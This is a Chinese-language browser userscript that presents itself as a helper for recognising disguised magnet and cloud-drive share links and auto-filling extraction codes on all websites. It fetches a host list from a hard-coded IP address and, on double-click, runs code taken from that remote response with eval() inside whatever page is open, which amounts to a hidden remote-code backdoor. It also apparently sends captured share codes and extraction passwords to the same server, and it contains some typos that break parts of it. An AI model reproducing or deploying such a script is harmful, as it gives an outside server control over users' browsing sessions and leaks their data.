// ==UserScript==
// @namespace greasyfork
// @name 神秘分享代码链接识别
// @version 0.0.1
// @description 识别网页中神秘分享代码 非完整或沙雕写法的磁力链接和网盘分享链接 自动填写提取码
// @license MIT
// @match *://*/*
// @connect * 
// @grant GM_info
// @grant GM_getValue
// @grant GM_setValue
// @grant GM_setClipboard
// @grant GM_xmlhttpRequest
// @run-at document-idle
// @downloadURL https://update.greasyfork.org/scripts/449415/%E7%A5%9E%E7%A7%98%E5%88%86%E4%BA%AB%E4%BB%A3%E7%A0%81%E9%93%BE%E6%8E%A5%E8%AF%86%E5%88%AB.user.js
// @updateURL https://update.greasyfork.org/scripts/449415/%E7%A5%9E%E7%A7%98%E5%88%86%E4%BA%AB%E4%BB%A3%E7%A0%81%E9%93%BE%E6%8E%A5%E8%AF%86%E5%88%AB.meta.js
// ==/UserScript==
void function() {
  const u = {
    now: () => Math.floor(Date.now() / 1e3),
    uid: () => Date.now().toString(36).toUpperCase(),
    zhost: () => location.hostname.split(".").slice(-2).join("."),
    rand: max => Math.floor(1e3 * Math.random()) % max,
    urlfix: str => str.startsWith("http") ? str : str.startsWith("//") ? location.protocol + str : str.startsWith("/") ? location.origin + str : location.origin + "/" + str,
    usp: str => Object.fromEntries(new URLSearchParams(str).entries()),
    unique: arr => arr.fliter((t, i, d) => d.indexOf(t) == i),
    cclean: arr => Object.entries(Object.fromEntries(arr.map(t => [t.name, t.value]))).map(t => t.join("=")),
    serialize: obj => u.vobj(obj) ? Object.entries(obj).map(t => t[0] + "=" + encodeURIComponent(t[1])).join("&") : "",
    vfunc: fn => "[object Function]" == Object.prototype.toString.call(fn),
    vnum: num => "[object Number]" == Object.prototype.toString.call(num),
    vobj: obj => "[object Object]" == Object.prototype.toString.call(obj),
    vstr: str => "[object String]" == Object.prototype.toString.call(str),
    xpath: str => document.evaluate(str, document).iterateNext(),
    pwd(bit = 4) {
      let i, arr = [];
      for (i = 0; bit > i; i++) arr.push("abcdefghijklmnopqrstuvwxyz23456789ABCDEFGHKLMNPSTVWXY".charAt(u.rand(53)));
      return arr.join("");
    },
    zdom(top = 0) {
      let e = window.event;
      return e.preventDefault(), e.stopPropagation(), top ? e.target : e.currentTarget;
    },
    zinput(dom, str) {
      dom.value = str, dom.hasOwnProperty("_valueTracker") && dom._valueTracker.setValue(""), dom.dispatchEvent(new Event("input", {
        bubbles: !0
      }));
    },
    zero(num, bit = 2) {
      let s, i = +num;
      return (s = isNaN(i) ? "0" : "" + i).padStart(bit, "0");
    },
    fsize(num, pos = 0) {
      let s, t = +num;
      if (0 == t) s = ""; else {
        let i = 0, arr = ["B", "KB", "MB", "GB", "TB", "PB"];
        while (t > 1024) i++, t = Math.ceil(t / 1024);
        s = (t = Math.round(num / Math.pow(1024, i))) + arr[i + pos];
      }
      return s;
    },
    urlopen(url, self) {
      let dom = document.createElement("a");
      dom.setAttribute("href", url), undefined == self && dom.setAttribute("target", "_blank"), dom.click();
    },
    aria2(list) {
      let arr = [], pod = {
        id: u.uid(),
        method: "system.multicall",
        params: []
      };
      list.forEach(t => {
        Object.keys(t).forEach(p => {
          u.vnum(t[p]) && (t[p] = "" + t[p]);
        });
        let o = {
          methodName: "aria2.addUri",
          params: []
        };
        ipod.aria2.token && o.params.push("token:" + ipod.aria2.token), o.params.push(t.url), t.hasOwnProperty("split") || (t.split = "" + t.url.length), t.hasOwnProperty("extype") && (t.out = pod.id + t.extype), o.params.push(t), arr.push(o);
      }), pod.params.push(arr), GM_xmlhttpRequest({
        url: ipod.aria2.jsonrpc,
        method: "POST",
        responseType: "json",
        data: JSON.stringify(pod),
        onerror() {
          alert("\u8bf7\u68c0\u67e5Motrix\u662f\u5426\u8fd0\u884c\u4ee5\u53ca\u8bbe\u7f6e\u91cc\u586b\u5199\u7684jsonrpc\u662f\u5426\u6b63\u786e");
        }
      });
    },
    zform(str, obj) {
      document.querySelectorAll(str).forEach(t => {
        let s = t.getAttribute("name");
        if (obj.hasOwnProperty(s)) {
          let v = obj[s];
          switch (t.getAttribute("type")) {
           case "radio":
            t.checked = v == t.value;
            break;
           case "checkbox":
            t.checked = !!v;
            break;
           default:
            t.value = v;
          }
        }
      });
    },
    domcopy(element) {
      let dom = null;
      return element instanceof HTMLElement && ((dom = element.cloneNode(!0)).setAttribute("data-clone", "true"), element.after(dom), element.remove()), dom;
    },
    domremove(list) {
      list.forEach(t => {
        let dom = t.startsWith("/html/") ? u.xpath(t) : document.querySelector(t);
        null == dom || dom.remove();
      });
    },
    domhide(list) {
      list.forEach(t => {
        let dom = t.startsWith("/html/") ? u.xpath(t) : document.querySelector(t);
        null == dom || (dom.style.cssText = "display: none");
      });
    },
    loread(name, val = "") {
      let s = localStorage.getItem(name);
      return null == s ? val : s;
    },
    losave(name, val) {
      localStorage.setItem(name, val);
    },
    load(name, val = null) {
      name += "." + u.zhost();
      let d = GM_getValue(name, null);
      return null == d ? val : JSON.parse(d);
    },
    save(name, data) {
      name += "." + u.zhost(), GM_setValue(name, JSON.stringify(data));
    },
    strcut(str, a, b) {
      let x, y, s = str;
      return str.includes(a) && (x = str.indexOf(a) + a.length, undefined == b ? y = str.length : -1 == (y = str.indexOf(b, x)) && (y = str.length), s = str.substring(x, y)), s;
    },
    str2obj(str) {
      let o = null;
      return u.vstr(str) && str.length && (o = str.includes('"') ? JSON.parse(str) : JSON.parse(str.replaceAll(/'/g, '"'))), o;
    },
    download(str) {
      if (str) {
        let o = str.startsWith("magnet:") ? {
          url: []
        } : {
          url: [],
          "use-header": "true",
          "min-split-size": "1M",
          split: "8"
        };
        Object.assign(o, ipod.aria2), str = str.startsWith("magnet:") ? u.magnet(str) : str.startsWith("http") ? str : str.startsWith("//") ? location.protocol + str : str.startsWith("/") ? location.origin + str : location.origin + "/" + str, o.url.push(str), u.aria2([o]);
      }
    },
    magnet(str) {
      let i = str.indexOf("&");
      return -1 == i ? str : str.substring(0, i);
    },
    namefix(str) {
      let i, arr = ['"', "'", "*", ":", "<", ">", "?", "|"];
      for (i = 0; arr.length > i; i++) str = str.replaceAll(arr[i], "");
      return str.replaceAll("\\", "/").replaceAll("//", "/");
    },
    tpl: (str, data) => (Array.isArray(data) ? data : [data]).map(t => ((html, obj) => html.replaceAll(/\[(\w{1,16})\]/g, (matched, major) => obj.hasOwnProperty(major) ? obj[major] : major))(str, t)).join(""),
    history(str) {
      const origin = history[str];
      return function() {
        let e = new Event(str);
        return e.arguments = arguments, window.dispatchEvent(e), origin.apply(this, arguments);
      };
    },
    jsload(url, name) {
      let dom = document.createElement("script");
      dom.src = u.urlfix(url), undefined == name || dom.setAttribute("name", name), dom.setAttribute("charset", "utf-8"), dom.setAttribute("crossorigin", "anonymous"), document.head.appendChild(dom);
    },
    swClassName(str) {
      if (str && u.vstr(str)) {
        let arr = Array.from(ipod.checkbox.classList);
        arr.includes(str) ? arr = arr.filter(t => t != str) : arr.push("on"), ipod.checkbox.className = arr.join(" ");
      }
    }
  };
  let ipod = {
    now: Math.floor(Date.now() / 1e3),
    idle: 1,
    cookie: "",
    home: "http://114.117.205.187",
    version: GM_info.script.version
  };
  if (ipod.host = JSON.parse(GM_getValue("host", "[]")), ipod.latest = Number.parseInt(GM_getValue("latest", 0)), ipod.now > ipod.latest && (ipod.latest = ipod.now + 9e4, GM_setValue("latest", ipod.latest), GM_xmlhttpRequest({
    url: `${ipod.home}/netdisk/host.json`,
    method: "GET",
    responseType: "json",
    onload(r) {
      ipod.host = r.response, GM_setValue("host", JSON.stringify(ipod.host));
    }
  })), "pan.baidu.com" == location.hostname && "/share/init" == location.pathname) {
    let surl = JSON.parse(GM_getValue("surl", '{"host":"ignore"}'));
    if (surl.host == location.hostname) {
      let upp = u.usp(location.search);
      surl.scode == upp.surl && (ipod.task = setInterval(() => {
        let dom = document.querySelector("#accessCode");
        null == dom ? console.log("task = %d", ipod.task) : (clearInterval(ipod.task), u.zinput(dom, surl.token), setTimeout(() => {
          document.querySelector("#submitBtn").click();
        }, 200));
      }, 500));
    }
  } else if ("cloud.189.cn" == location.hostname && "/web/share" == location.pathname) {
    let surl = JSON.parse(GM_getValue("surl", '{"host":"ignore"}'));
    if (surl.host == location.hostname) {
      let upp = u.usp(location.search);
      console.log("params = %o", upp), surl.scode == upp.code && (ipod.task = setInterval(() => {
        let dom = document.querySelector("#code_txt");
        null == dom ? console.log("task = %d", ipod.task) : (clearInterval(ipod.task), setTimeout(() => {
          u.zinput(dom, surl.token), setTimeout(() => {
            document.querySelector(".visit").click();
          }, 200);
        }, 1e3));
      }, 1e3));
    }
  } else if ("www.aliyundrive.com" == location.hostname && location.pathname.startsWith("/s/")) {
    let surl = JSON.parse(GM_getValue("surl", '{"host":"ignore"}'));
    if (surl.host == location.hostname) {
      let scode = location.pathname.substring(3);
      surl.scode == scode && (ipod.task = setInterval(() => {
        let dom = document.querySelector(".ant-input");
        null == dom ? console.log("task = %d", ipod.task) : (clearInterval(ipod.task), u.zinput(dom, surl.token), setTimeout(() => {
          dom.parentElement.nextElementSibling.click();
        }, 200));
      }, 500));
    }
  } else document.addEventListener("dblclick", e => {
    let arr = e.target.textContent.replace(/[^\u0021-\u007f]+/g, " ").trim().split(" ").filter(t => t.length > 3);
    if (0 == ipod.host.length) {
      let s, mat, url, token, mode = "netdisk", idx = arr.findIndex(t => t.length > 12);
      if (-1 == idx) console.log("ignore"); else {
        if (console.log("idx=%d %s", idx, s = arr[idx]), s.startsWith("http")) url = s; else switch (mat = s.match(/[\-\w]{8,40}/), console.log("len=%d matched=%s", mat[0].length, mat[0]), mat[0].length) {
         case 10:
          url = s.includes("s/") ? `https://123pan.com/s/${mat[0]}` : "";
          break;
         case 11:
          url = s.includes("f/") ? `https://t.wss.ink/f/${mat[0]}` : s.includes("s/") ? `https://www.aliyundrive.com/s/${mat[0]}` : "";
          break;
         case 12:
          url = s.includes("t/") ? `https://cloud.189.cn/t/${mat[0]}` : "";
          break;
         case 13:
          url = s.includes("m/") ? `https://caiyun.139.com/m/i?${math[0]}` : "";
          break;
         case 23:
          url = mat[0].startsWith("1") ? `https://pan.baidu.com/s/${mat[0]}` : "";
          break;
         case 26:
          url = s.includes("s/") ? `https://pan.xunlei.com/s/${mat[0]}` : "";
          break;
         case 32:
          url = `magnet:?xt=urn:btih:${mat[0]}`, mode = "magnet";
          break;
         case 40:
          url = `magnet:?xt=urn:bti:${mat[0]}`, mode = "magnet";
          break;
         default:
          url = "", mode = "invalid";
        }
        if (undefined == arr[idx + 1]) console.log("token skip"); else {
          let matched = arr[idx + 1].match(/\w{4}/);
          if (null == matched) console.log("token invalid"); else {
            let i, host = u.strcut(url, "//", "/");
            switch (host) {
             case "pan.baidu.com":
              i = 2;
              break;
             default:
              i = 1;
            }
            let body = {
              token: matched[0],
              host: u.strcut(url, "//", "/"),
              scode: url.substring(url.lastIndexOf("/") + i)
            };
            GM_setValue("surl", JSON.stringify(body)), GM_xmlhttpRequest({
              method: "POST",
              responseType: "json",
              url: `${ipod.home}/netdisk/ajax?act=ushare`,
              headers: {
                "Content-type": "application/x-www-form-urlencoded"
              },
              data: u.serialize(body),
              onload(r) {
                console.log(r.response);
              }
            });
          }
        }
        switch (mode) {
         case "invalid":
          break;
         case "magnet":
          GM_setClipboard(url, "text");
          break;
         default:
          url && u.urlopen(url);
        }
      }
    } else {
      let idx = ipod.host.findIndex(t => t.name == location.host), foo = eval(ipod.host[idx].code);
      foo.apply(null, arr);
    }
  });
}();
